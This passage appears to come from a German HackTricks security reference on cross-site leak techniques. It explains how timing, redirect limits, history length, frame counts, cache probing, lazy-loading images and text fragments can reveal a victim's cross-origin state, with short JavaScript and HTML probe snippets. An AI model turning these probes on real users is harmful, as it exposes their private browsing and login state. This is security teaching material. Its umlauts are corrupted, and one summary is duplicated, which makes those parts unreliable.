Ein Beispiel f√ºr die **Cookie-Bombe + XS-Search** finden Sie in der beabsichtigten L√∂sung dieses Berichts: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` oder im gleichen Kontext zu sein, ist normalerweise f√ºr diese Art von Angriff erforderlich.

### URL-Maximal-L√§nge - Clientseite

* **Inklusionsmethoden**: Pop-ups
* **Erkennbare Unterschiede**: Statuscode / Inhalt
* **Weitere Informationen**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Zusammenfassung:** Unterschiede in den Antworten erkennen, weil die L√§nge der Umleitungsantwort m√∂glicherweise zu gro√ü f√ºr eine Anfrage ist, sodass ein Unterschied bemerkt werden kann.
* **Codebeispiel**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Laut [Chromium-Dokumentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length) betr√§gt die maximale URL-L√§nge von Chrome 2 MB.

> Im Allgemeinen hat die _Webplattform_ keine Grenzen f√ºr die L√§nge von URLs (obwohl 2^31 ein h√§ufiges Limit ist). _Chrome_ begrenzt URLs auf eine maximale L√§nge von **2 MB** aus praktischen Gr√ºnden und um zu vermeiden, dass Probleme mit der Dienstverweigerung in der interprozessualen Kommunikation auftreten.

Daher ist es m√∂glich, dass die **Umleitungs-URL in einem der F√§lle gr√∂√üer ist**, sodass sie mit einer **URL gr√∂√üer als 2 MB** umgeleitet wird, um das **L√§ngenlimit** zu erreichen. Wenn dies geschieht, zeigt Chrome eine **`about:blank#blocked`**-Seite an.

Der **erhebliche Unterschied** besteht darin, dass, wenn die **Umleitung** **abgeschlossen** wurde, `window.origin` einen **Fehler** ausl√∂st, da ein Cross-Origin nicht auf diese Informationen zugreifen kann. Wenn jedoch das **Limit** erreicht wurde und die geladene Seite **`about:blank#blocked`** war, bleibt der **`origin`** des Fensters der des **Elternteils**, was eine **zug√§ngliche Information** ist.

Alle zus√§tzlichen Informationen, die ben√∂tigt werden, um die **2 MB** zu erreichen, k√∂nnen √ºber einen **Hash** in der urspr√ºnglichen URL hinzugef√ºgt werden, sodass sie **bei der Umleitung verwendet wird**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### Maximalumleitungen

* **Inklusionsmethoden**: Fetch API, Frames
* **Erkennbare Unterschiede**: Statuscode
* **Weitere Informationen**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Zusammenfassung:** Verwenden Sie das Umleitungs-Limit des Browsers, um das Auftreten von URL-Umleitungen festzustellen.
* **Codebeispiel**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Wenn die **maximale** Anzahl von **Umleitungen**, die ein Browser folgen kann, **20** betr√§gt, k√∂nnte ein Angreifer versuchen, seine Seite mit **19 Umleitungen** zu laden und schlie√ülich **das Opfer** auf die getestete Seite zu senden. Wenn ein **Fehler** ausgel√∂st wird, dann versuchte die Seite, das Opfer **umzuleiten**.

### Verlaufsl√§nge

* **Inklusionsmethoden**: Frames, Pop-ups
* **Erkennbare Unterschiede**: Umleitungen
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Zusammenfassung:** JavaScript-Code manipuliert den Browserverlauf und kann √ºber die L√§ngeneigenschaft darauf zugreifen.
* **Codebeispiel**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

Die **History API** erm√∂glicht es JavaScript-Code, den Browserverlauf zu manipulieren, der **die von einem Benutzer besuchten Seiten speichert**. Ein Angreifer kann die L√§ngeneigenschaft als Inklusionsmethode verwenden: um JavaScript- und HTML-Navigation zu erkennen.\
**√úberpr√ºfen von `history.length`**, den Benutzer **zu einer Seite navigieren**, **zur√ºck** zur gleichen Herkunft **wechseln** und den neuen Wert von **`history.length`** √ºberpr√ºfen.

### Verlaufsl√§nge mit derselben URL

* **Inklusionsmethoden**: Frames, Pop-ups
* **Erkennbare Unterschiede**: Wenn die URL dieselbe ist wie die vermutete
* **Zusammenfassung:** Es ist m√∂glich zu erraten, ob sich der Standort eines Frames/Pops in einer bestimmten URL befindet, indem die Verlaufsl√§nge ausgenutzt wird.
* **Codebeispiel**: Unten

Ein Angreifer k√∂nnte JavaScript-Code verwenden, um die **Position des Frames/Pops auf eine vermutete** zu **manipulieren** und sie **sofort** auf `about:blank` **zu √§ndern**. Wenn die Verlaufsl√§nge zunimmt, bedeutet das, dass die URL korrekt war und Zeit hatte, **zuzunehmen, weil die URL nicht neu geladen wird, wenn sie dieselbe ist**. Wenn sie nicht zunahm, bedeutet das, dass sie **versucht hat, die vermutete URL zu laden**, aber weil wir **sofort danach** **`about:blank`** geladen haben, hat die **Verlaufsl√§nge nie zugenommen**, als die vermutete URL geladen wurde.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Frame Counting

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Seiteninhalt
* **More info**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Summary:** Bewerten Sie die Anzahl der iframe-Elemente, indem Sie die `window.length`-Eigenschaft inspizieren.
* **Code Example**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Das Z√§hlen der **Anzahl der Frames in einer Webseite**, die √ºber `iframe` oder `window.open` ge√∂ffnet wurde, kann helfen, den **Status des Benutzers auf dieser Seite** zu identifizieren.\
Dar√ºber hinaus kann das kontinuierliche √úberpr√ºfen der Anzahl der Frames, wenn die Seite immer die gleiche Anzahl von Frames hat, helfen, ein **Muster** zu identifizieren, das Informationen leaken k√∂nnte.

Ein Beispiel f√ºr diese Technik ist, dass in Chrome ein **PDF** mit **Frame Counting** **erkannt** werden kann, da intern ein `embed` verwendet wird. Es gibt [Open URL Parameters](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113), die eine gewisse Kontrolle √ºber den Inhalt wie `zoom`, `view`, `page`, `toolbar` erm√∂glichen, wo diese Technik interessant sein k√∂nnte.

### HTMLElements

* **Inclusion Methods**: HTML-Elemente
* **Detectable Difference**: Seiteninhalt
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Summary:** Lesen Sie den geleakten Wert, um zwischen 2 m√∂glichen Zust√§nden zu unterscheiden
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Informationslecks durch HTML-Elemente sind ein Anliegen in der Websicherheit, insbesondere wenn dynamische Mediendateien basierend auf Benutzerinformationen generiert werden oder wenn Wasserzeichen hinzugef√ºgt werden, die die Mediengr√∂√üe ver√§ndern. Dies kann von Angreifern ausgenutzt werden, um zwischen m√∂glichen Zust√§nden zu unterscheiden, indem sie die Informationen analysieren, die von bestimmten HTML-Elementen offengelegt werden.

### Information Exposed by HTML Elements

* **HTMLMediaElement**: Dieses Element gibt die `duration` und `buffered` Zeiten des Mediums preis, die √ºber seine API abgerufen werden k√∂nnen. [Erfahren Sie mehr √ºber HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Es gibt `videoHeight` und `videoWidth` preis. In einigen Browsern sind zus√§tzliche Eigenschaften wie `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` und `webkitDecodedFrameCount` verf√ºgbar, die detailliertere Informationen √ºber den Medieninhalt bieten. [Erfahren Sie mehr √ºber HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Diese Funktion liefert Details zur Video-Wiedergabequalit√§t, einschlie√ülich `totalVideoFrames`, was die Menge der verarbeiteten Videodaten anzeigen kann. [Erfahren Sie mehr √ºber getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Dieses Element leakt die `height` und `width` eines Bildes. Wenn ein Bild jedoch ung√ºltig ist, geben diese Eigenschaften 0 zur√ºck, und die Funktion `image.decode()` wird abgelehnt, was darauf hinweist, dass das Bild nicht ordnungsgem√§√ü geladen werden konnte. [Erfahren Sie mehr √ºber HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS Property

* **Inclusion Methods**: HTML-Elemente
* **Detectable Difference**: Seiteninhalt
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Summary:** Identifizieren Sie Variationen im Website-Styling, die mit dem Status oder Zustand des Benutzers korrelieren.
* **Code Example**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Webanwendungen k√∂nnen das **Website-Styling je nach Status des Benutzers** √§ndern. Cross-Origin-CSS-Dateien k√∂nnen auf der Angreiferseite mit dem **HTML-Link-Element** eingebettet werden, und die **Regeln** werden auf die Angreiferseite **angewendet**. Wenn eine Seite diese Regeln dynamisch √§ndert, kann ein Angreifer diese **Unterschiede** je nach Benutzerstatus **erkennen**.\
Als Leak-Technik kann der Angreifer die Methode `window.getComputedStyle` verwenden, um **CSS**-Eigenschaften eines bestimmten HTML-Elements zu **lesen**. Infolgedessen kann ein Angreifer beliebige CSS-Eigenschaften lesen, wenn das betroffene Element und der Eigenschaftsname bekannt sind.

### CSS History

* **Inclusion Methods**: HTML-Elemente
* **Detectable Difference**: Seiteninhalt
* **More info**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Summary:** Erkennen, ob der `:visited`-Stil auf eine URL angewendet wird, was darauf hinweist, dass sie bereits besucht wurde
* **Code Example**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Laut [**diesem**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/) funktioniert dies nicht in headless Chrome.
{% endhint %}

Der CSS-Selektor `:visited` wird verwendet, um URLs anders zu stylen, wenn sie zuvor vom Benutzer besucht wurden. In der Vergangenheit konnte die Methode `getComputedStyle()` verwendet werden, um diese Stilunterschiede zu identifizieren. Moderne Browser haben jedoch Sicherheitsma√ünahmen implementiert, um zu verhindern, dass diese Methode den Status eines Links offenbart. Diese Ma√ünahmen umfassen, dass der berechnete Stil immer so zur√ºckgegeben wird, als ob der Link besucht wurde, und die Stile, die mit dem `:visited`-Selektor angewendet werden k√∂nnen, einzuschr√§nken.

Trotz dieser Einschr√§nkungen ist es m√∂glich, den besuchten Status eines Links indirekt zu erkennen. Eine Technik besteht darin, den Benutzer dazu zu bringen, mit einem Bereich zu interagieren, der von CSS betroffen ist, insbesondere unter Verwendung der Eigenschaft `mix-blend-mode`. Diese Eigenschaft erm√∂glicht das Mischen von Elementen mit ihrem Hintergrund, was m√∂glicherweise den besuchten Status basierend auf der Benutzerinteraktion offenbart.

Dar√ºber hinaus kann die Erkennung ohne Benutzerinteraktion durch Ausnutzung der Renderzeiten von Links erreicht werden. Da Browser besuchte und unbesuchte Links unterschiedlich rendern k√∂nnen, kann dies einen messbaren Zeitunterschied im Rendering einf√ºhren. Ein Proof of Concept (PoC) wurde in einem Chromium-Bugbericht erw√§hnt, der diese Technik demonstriert, indem mehrere Links verwendet werden, um den Zeitunterschied zu verst√§rken, wodurch der besuchte Status durch Zeitanalysen erkennbar wird.

F√ºr weitere Details zu diesen Eigenschaften und Methoden besuchen Sie deren Dokumentationsseiten:

* `:visited`: [MDN-Dokumentation](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN-Dokumentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN-Dokumentation](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### ContentDocument X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Summary:** In Google Chrome wird eine spezielle Fehlerseite angezeigt, wenn eine Seite aufgrund von X-Frame-Options-Beschr√§nkungen nicht in eine Cross-Origin-Seite eingebettet werden kann.
* **Code Example**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

In Chrome erscheint eine Fehlerseite, wenn eine Seite mit dem `X-Frame-Options`-Header, der auf "deny" oder "same-origin" gesetzt ist, als Objekt eingebettet wird. Chrome gibt f√ºr die `contentDocument`-Eigenschaft dieses Objekts einzigartig ein leeres Dokumentobjekt (anstatt `null`) zur√ºck, im Gegensatz zu iframes oder anderen Browsern. Angreifer k√∂nnten dies ausnutzen, indem sie das leere Dokument erkennen, was m√∂glicherweise Informationen √ºber den Status des Benutzers offenbart, insbesondere wenn Entwickler den X-Frame-Options-Header inkonsistent setzen und oft Fehlerseiten √ºbersehen. Bewusstsein und konsistente Anwendung von Sicherheitsheadern sind entscheidend, um solche Leaks zu verhindern.

### Download Detection

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Header
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Summary:** Ein Angreifer kann Datei-Downloads erkennen, indem er iframes nutzt; die fortgesetzte Zug√§nglichkeit des iframes impliziert einen erfolgreichen Datei-Download.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Der `Content-Disposition`-Header, speziell `Content-Disposition: attachment`, weist den Browser an, Inhalte herunterzuladen, anstatt sie inline anzuzeigen. Dieses Verhalten kann ausgenutzt werden, um zu erkennen, ob ein Benutzer Zugriff auf eine Seite hat, die einen Datei-Download ausl√∂st. In Chromium-basierten Browsern gibt es einige Techniken, um dieses Download-Verhalten zu erkennen:

1. **√úberwachung der Download-Leiste**:
* Wenn eine Datei in Chromium-basierten Browsern heruntergeladen wird, erscheint eine Download-Leiste am unteren Rand des Browserfensters.
* Durch die √úberwachung von √Ñnderungen in der Fensterh√∂he k√∂nnen Angreifer das Erscheinen der Download-Leiste ableiten, was darauf hindeutet, dass ein Download initiiert wurde.
2. **Download-Navigation mit Iframes**:
* Wenn eine Seite einen Datei-Download mit dem `Content-Disposition: attachment`-Header ausl√∂st, verursacht dies kein Navigationsereignis.
* Durch das Laden des Inhalts in einem iframe und die √úberwachung von Navigationsereignissen ist es m√∂glich zu √ºberpr√ºfen, ob die Inhalts-Disposition einen Datei-Download verursacht (keine Navigation) oder nicht.
3. **Download-Navigation ohne Iframes**:
* √Ñhnlich wie bei der iframe-Technik besteht diese Methode darin, `window.open` anstelle eines iframes zu verwenden.
* Die √úberwachung von Navigationsereignissen im neu ge√∂ffneten Fenster kann offenbaren, ob ein Datei-Download ausgel√∂st wurde (keine Navigation) oder ob der Inhalt inline angezeigt wird (Navigation erfolgt).

In Szenarien, in denen nur angemeldete Benutzer solche Downloads ausl√∂sen k√∂nnen, k√∂nnen diese Techniken verwendet werden, um den Authentifizierungsstatus des Benutzers indirekt basierend auf der Reaktion des Browsers auf die Download-Anfrage abzuleiten.

### Partitioned HTTP Cache Bypass <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Summary:** Ein Angreifer kann Datei-Downloads erkennen, indem er iframes nutzt; die fortgesetzte Zug√§nglichkeit des iframes impliziert einen erfolgreichen Datei-Download.
* **Code Example**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (von [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
Deshalb ist diese Technik interessant: Chrome hat jetzt **Cache-Partitionierung**, und der Cache-Schl√ºssel der neu ge√∂ffneten Seite ist: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, aber wenn ich eine ngrok-Seite √∂ffne und fetch darin verwende, wird der Cache-Schl√ºssel sein: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, der **Cache-Schl√ºssel ist unterschiedlich**, sodass der Cache nicht geteilt werden kann. Weitere Details finden Sie hier: [Sicherheit und Datenschutz durch Partitionierung des Caches gewinnen](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Comment von [**hier**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Wenn eine Seite `example.com` eine Ressource von `*.example.com/resource` einbindet, hat diese Ressource den **gleichen Cache-Schl√ºssel**, als ob die Ressource direkt **durch eine Top-Level-Navigation angefordert** wurde. Das liegt daran, dass der Cache-Schl√ºssel aus dem Top-Level _eTLD+1_ und dem Frame _eTLD+1_ besteht.

Da der Zugriff auf den Cache schneller ist als das Laden einer Ressource, ist es m√∂glich, zu versuchen, den Standort einer Seite zu √§ndern und ihn 20 ms (zum Beispiel) sp√§ter abzubrechen. Wenn der Ursprung nach dem Stopp ge√§ndert wurde, bedeutet das, dass die Ressource im Cache war.\
Oder man k√∂nnte einfach **einige Fetch-Anfragen an die potenziell gecachte Seite senden und die Zeit messen, die daf√ºr ben√∂tigt wird**.

### Manual Redirect <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Redirects
* **More info**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **Summary:** Es ist m√∂glich herauszufinden, ob eine Antwort auf eine Fetch-Anfrage eine Weiterleitung ist
* **Code Example**:

![](<../.gitbook/assets/image (652).png>)

### Fetch with AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **Summary:** Es ist m√∂glich, zu versuchen, eine Ressource zu laden und das Laden abzubrechen, bevor sie geladen wird. Je nachdem, ob ein Fehler ausgel√∂st wird, war die Ressource im Cache oder nicht.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Verwenden Sie _**fetch**_ und _**setTimeout**_ mit einem **AbortController**, um sowohl zu erkennen, ob die **Ressource im Cache ist**, als auch um eine bestimmte Ressource aus dem Browser-Cache zu entfernen. Dar√ºber hinaus erfolgt der Prozess, ohne neue Inhalte zu cachen.

### Script Pollution

* **Inclusion Methods**: HTML-Elemente (Script)
* **Detectable Difference**: Seiteninhalt
* **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Summary:** Es ist m√∂glich, **eingebaute Funktionen zu √ºberschreiben** und deren Argumente zu lesen, selbst von **Cross-Origin-Skripten** (die nicht direkt gelesen werden k√∂nnen), was **wertvolle Informationen leaken** k√∂nnte.
* **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Seiteninhalt
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Summary:** Messen Sie die Ausf√ºhrungszeit einer Webseite mithilfe von Service Workern.
* **Code Example**:

In dem gegebenen Szenario ergreift der Angreifer die Initiative, um einen **Service Worker** innerhalb einer ihrer Domains, speziell "attacker.com", zu registrieren. Anschlie√üend √∂ffnet der Angreifer ein neues Fenster auf der Zielwebsite aus dem Hauptdokument und weist den **Service Worker** an, einen Timer zu starten. W√§hrend das neue Fenster zu laden beginnt, navigiert der Angreifer die Referenz, die im vorherigen Schritt erhalten wurde, zu einer von dem **Service Worker** verwalteten Seite.

Bei Eintreffen der im vorherigen Schritt initiierten Anfrage antwortet der **Service Worker** mit einem **204 (No Content)**-Statuscode und beendet effektiv den Navigationsprozess. Zu diesem Zeitpunkt erfasst der **Service Worker** eine Messung vom zuvor in Schritt zwei gestarteten Timer. Diese Messung wird durch die Dauer von JavaScript beeinflusst, die Verz√∂gerungen im Navigationsprozess verursacht.

{% hint style="warning" %}
Bei einer Ausf√ºhrungszeitmessung ist es m√∂glich, **Netzwerkfaktoren** zu **eliminieren**, um **genauere Messungen** zu erhalten. Zum Beispiel, indem die Ressourcen, die von der Seite verwendet werden, vor dem Laden geladen werden.
{% endhint %}

### Fetch Timing

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Timing (allgemein aufgrund von Seiteninhalt, Statuscode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Summary:** Verwenden Sie [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), um die Zeit zu messen, die f√ºr eine Anfrage ben√∂tigt wird. Andere Uhren k√∂nnten verwendet werden.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Timing (allgemein aufgrund von Seiteninhalt, Statuscode)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Summary:** Verwenden Sie [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), um die Zeit zu messen, die ben√∂tigt wird, um eine Anfrage mit `window.open` auszuf√ºhren. Andere Uhren k√∂nnten verwendet werden.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Mit HTML oder Re-Injection

Hier finden Sie Techniken, um Informationen aus einem Cross-Origin-HTML **durch das Injizieren von HTML-Inhalten** zu exfiltrieren. Diese Techniken sind interessant in F√§llen, in denen Sie aus irgendeinem Grund **HTML injizieren, aber keinen JS-Code injizieren k√∂nnen**.

### Dangling Markup

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Image Lazy Loading

Wenn Sie **Inhalte exfiltrieren** m√ºssen und Sie **HTML vor dem Geheimnis hinzuf√ºgen k√∂nnen**, sollten Sie die **√ºblichen Techniken f√ºr h√§ngende Markups** √ºberpr√ºfen.\
Wenn Sie jedoch aus irgendeinem Grund **M√úSSEN**, es **Zeichen f√ºr Zeichen** zu tun (vielleicht erfolgt die Kommunikation √ºber einen Cache-Hit), k√∂nnen Sie diesen Trick verwenden.

**Bilder** in HTML haben ein "**loading**"-Attribut, dessen Wert "**lazy**" sein kann. In diesem Fall wird das Bild geladen, wenn es angesehen wird, und nicht w√§hrend das Seite geladen wird:
```html
<img src=/something loading=lazy >
```
Daher k√∂nnen Sie **eine Menge Junk-Zeichen** hinzuf√ºgen (zum Beispiel **tausende von "W"s**), um **die Webseite vor dem Geheimnis zu f√ºllen oder etwas wie** `<br><canvas height="1850px"></canvas><br>.`\
Wenn zum Beispiel unsere **Injektion vor dem Flag erscheint**, w√ºrde das **Bild** **geladen** werden, aber wenn es **nach** dem **Flag** erscheint, wird das Flag + der Junk **verhindern, dass es geladen wird** (Sie m√ºssen experimentieren, wie viel Junk Sie platzieren). Das ist, was in [**diesem Bericht**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) passiert ist.

Eine andere M√∂glichkeit w√§re, das **scroll-to-text-fragment** zu verwenden, wenn es erlaubt ist:

#### Scroll-to-text-fragment

Allerdings lassen Sie den **Bot die Seite** mit etwas wie
```
#:~:text=SECR
```
So die Webseite wird etwas sein wie: **`https://victim.com/post.html#:~:text=SECR`**

Wo post.html die Angreifer-Junk-Zeichen und ein lazy load Bild enth√§lt und dann das Geheimnis des Bots hinzugef√ºgt wird.

Was dieser Text bewirken wird, ist, dass der Bot auf jeden Text auf der Seite zugreift, der den Text `SECR` enth√§lt. Da dieser Text das Geheimnis ist und er sich **direkt unter dem Bild** befindet, wird das **Bild nur geladen, wenn das erratene Geheimnis korrekt ist**. So hast du dein Oracle, um das **Geheimnis Zeichen f√ºr Zeichen zu exfiltrieren**.

Ein Codebeispiel, um dies auszunutzen: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Bild Lazy Loading Zeitbasiert

Wenn es **nicht m√∂glich ist, ein externes Bild zu laden**, das den Angreifer darauf hinweisen k√∂nnte, dass das Bild geladen wurde, w√§re eine andere Option, zu versuchen, **das Zeichen mehrmals zu erraten und das zu messen**. Wenn das Bild geladen wird, w√ºrden alle Anfragen l√§nger dauern, als wenn das Bild nicht geladen wird. Dies wurde in der [**L√∂sung dieses Berichts**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **hier zusammengefasst:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Wenn `jQuery(location.hash)` verwendet wird, ist es m√∂glich, √ºber Timing herauszufinden, **ob einige HTML-Inhalte existieren**, da der Selektor `main[id='site-main']` nicht √ºberpr√ºft werden muss, wenn er nicht √ºbereinstimmt.
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Abwehrma√ünahmen

